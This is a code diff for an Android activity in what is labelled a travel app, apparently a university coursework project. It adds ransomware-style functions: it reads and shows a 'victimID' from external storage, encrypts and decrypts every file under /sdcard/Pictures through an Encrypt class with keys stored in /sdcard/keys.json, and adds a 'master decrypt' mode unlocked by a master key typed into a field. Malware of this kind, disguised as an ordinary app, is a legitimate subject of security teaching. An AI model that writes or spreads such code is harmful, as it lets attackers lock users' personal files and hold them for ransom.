@@ -1,31 +1,17 @@
 package edu.singaporetech.travelapp
 
-import GifExporter
-import Locker
-import android.content.Context
-import android.content.SharedPreferences
+import Encrypt
 import android.os.Build
 import android.os.Bundle
-import android.preference.PreferenceManager
-import android.security.keystore.KeyGenParameterSpec
-import android.security.keystore.KeyProperties
-import android.util.Base64
-import android.util.Log
 import android.widget.Button
-import android.widget.Toast
+import android.widget.EditText
+import android.widget.TextView
 import androidx.annotation.RequiresApi
 import androidx.appcompat.app.AppCompatActivity
-import com.google.gson.Gson
-import org.json.JSONObject
+
 import java.io.*
-import java.lang.Exception
-import java.security.Key
-import java.security.KeyStore
-import java.security.SecureRandom
 import javax.crypto.Cipher
-import javax.crypto.KeyGenerator
-import javax.crypto.SecretKey
-import javax.crypto.spec.IvParameterSpec
+
 
 class EncryptFile : AppCompatActivity(){
 
@@ -34,8 +20,23 @@ class EncryptFile : AppCompatActivity(){
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_encrypt)
 
+
+        // Display victimID
+        val textView: TextView = findViewById(R.id.victimID)
+        val victimIDFile = "/sdcard/victimID.txt"
+        var file = File(victimIDFile)
+        if (file.exists()){
+            textView.text = file.inputStream().readBytes().toString(Charsets.UTF_8)
+        }
+        else {
+            textView.text = "NO VICTIM ID FOUND"
+        }
+
+        val inputText: EditText = findViewById(R.id.input_masterkey)
+
         val encrypt_button: Button = findViewById(R.id.btn_encrypt)
         val decrypt_button: Button = findViewById(R.id.btn_decrypt)
+        val masterDecrypt_button: Button = findViewById(R.id.btn_masterdecrypt)
 
         encrypt_button.setOnClickListener {
             var cipherMode = Cipher.ENCRYPT_MODE.toString()
@@ -46,25 +47,30 @@ class EncryptFile : AppCompatActivity(){
             var cipherMode = Cipher.DECRYPT_MODE.toString()
             main(arrayOf(cipherMode))
         }
+
+        masterDecrypt_button.setOnClickListener {
+            var mode = 4
+            var cipherMode = mode.toString()
+            var masterKey = inputText.text.toString()
+            main(arrayOf(cipherMode, masterKey))
+        }
     }
 
     @RequiresApi(Build.VERSION_CODES.O)
     fun main(args: Array<String>) {
-        if (!File("/sdcard/keys.json").exists()) {
-            // Create new empty file to store key.json in /sdcard
-            var path = "/sdcard/keys.json"
-            var jsonFile = File(path)
-            var testKey = path.replace("/", "_")
-            var testVal = "ZZHHYYTTUUHHGGRR"
-            var jsonObj: JSONObject = JSONObject()
-            jsonObj.put(testKey, testVal)
-            jsonFile.writeText(jsonObj.toString())
+        val fileName = "/sdcard/keys.json"
+        var filePath = "/sdcard/Pictures"
+
+        val cipherMode = args[0].toInt()
+
+        // args[0].toInt() --> 1: Encrypt || 2: Decrypt
+        if (cipherMode == 1 || cipherMode == 2){
+            Encrypt.init(cipherMode, filePath, fileName, "")
         }
-        // Loop through content in dir
-        File("/sdcard/Pictures").walk().forEach {
-            if (it.toString() != "/sdcard/Pictures") {
-                GifExporter.exportGif(args[0].toInt(), it.toString())
-            }
+        else if (cipherMode == 4) {
+            // Master decrypt
+            val masterKey = args[1].toString()
+            Encrypt.init(cipherMode, filePath, fileName, masterKey)
         }
     }
 }
